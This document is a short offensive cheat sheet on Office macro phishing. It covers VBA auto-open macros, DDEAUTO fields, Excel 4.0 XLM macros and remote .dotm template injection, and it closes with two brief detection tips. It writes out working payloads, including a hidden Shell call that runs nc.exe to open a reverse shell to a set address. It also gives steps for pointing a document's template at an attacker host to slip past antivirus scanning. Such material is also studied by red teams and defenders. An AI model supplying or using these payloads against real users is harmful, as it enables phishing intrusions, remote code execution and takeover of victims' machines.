# Office Macro Phishing Techniques

## VBA Macros (T1137)
- Create macro-enabled doc (.docm/.dotm), use `Document_Open()` or `AutoOpen()` for auto-exec
- Payload: `Shell("C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe", vbHide)`
- Office files are ZIP archives; macros stored in `vbaProject.bin`

## DDE (T1173)
- Insert field in Word, toggle field codes, replace with:
  `DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"`
- No macros needed; victim sees two prompts before execution

## XLM Macro 4.0
- Insert "MS Excel 4.0 Macro" sheet, enter in cells:
  `=exec("c:\shell.cmd")` / `=halt()`
- Rename cell A1 to `Auto_Open` for auto-execution
- Supports Win32 API calls for shellcode injection

## Remote .dotm Template Injection
1. Create malicious .dotm with macro payload
2. Create benign .docx, rename to .zip, unzip
3. Edit `word\_rels\settings.xml.rels` — change template Target to:
   `http://attacker/Doc3.dotm` or `\\attacker\share\Doc3.dotm`
4. Re-zip as .docx — macro loads from remote template on open
- Bypasses static AV scanning (docx itself has no macros)

## Detection
- Monitor Office apps spawning cmd.exe/powershell.exe
- Inspect vbaProject.bin, document.xml in unzipped Office files
